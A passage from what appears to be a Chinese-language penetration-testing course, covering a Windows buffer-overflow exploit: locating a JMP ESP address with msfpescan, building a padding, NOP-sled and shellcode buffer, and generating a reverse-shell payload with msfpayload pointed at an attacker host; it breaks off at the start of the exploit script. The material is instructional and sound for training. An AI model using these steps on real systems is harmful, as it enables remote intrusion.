## 7.5 - 重定向执行流

现在我们有了可用的缓冲区空间和已识别的坏字符（`\x00`、`\x0A`、`\x0D`），我们需要将执行流重定向到我们的 `shellcode`。由于 `ESP` 指向我们的缓冲区，我们可以使用 `JMP ESP` 指令。我们可以使用 `mona.py` 或 `msfpescan` 来查找不包含坏字符的 `JMP ESP` 地址。

```bash
root@kali:~# msfpescan -j esp slmfc.dll
```

找到合适的地址后，更新缓冲区结构：`[填充] + [JMP ESP 地址] + [NOP 滑板] + [Shellcode]`。

![已到达 JMP ESP 断点](img/ea60ac7a8762deadd3823235c817f96d_150_0.png)

图 44 - 已到达 JMP ESP 断点

注意看我们的 `ESP` 跳转是如何触发的，由于我们设置了断点，调试器已经暂停，并通告我们断点已被命中。在调试器中按 `F7` 将单步进入 `shellcode`，目前它只是一堆字母“s”。

## 7.6 - 使用 Metasploit 生成 Shellcode

从头开始编写 `shellcode` 超出了本课程的范围，但 Metasploit Framework 为我们提供了工具和实用程序，使得生成复杂的负载变得一项简单任务。`msfpayload` 命令可以自动生成 275 种 `shellcode` 负载选项。

```bash
root@kali:~# msfpayload -l
```

我们将使用一个名为 `windows/shell_reverse_tcp` 的基本负载，它的作用类似于反向 shell netcat。该负载至少需要一个 `LHOST` 参数，用于定义发送反向 shell 的 IP。也可以定义一个指定连接端口的 `LPORT` 参数。Metasploit 脚本将使用以下命令生成 C 语言格式（`C` 参数）的 `shellcode`：

```bash
root@kali:~# msfpayload windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 C
```

## 7.7 - 获取 Shell

获取反向 shell 只需要将我们的缓冲区替换为 `shellcode` 并通过网络发送漏洞。然而，由于 `ESP` 指向我们的负载，Metasploit 解码器将覆盖 `shellcode` 的前几字节使其失效。我们可以通过在 `shellcode` 头部添加 `NOP` (`0x90`) 指令来避免这个问题，该指令无所作为——只需移动到下一条要执行的指令。我们的漏洞利用脚本看起来如下：

```python
#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
```
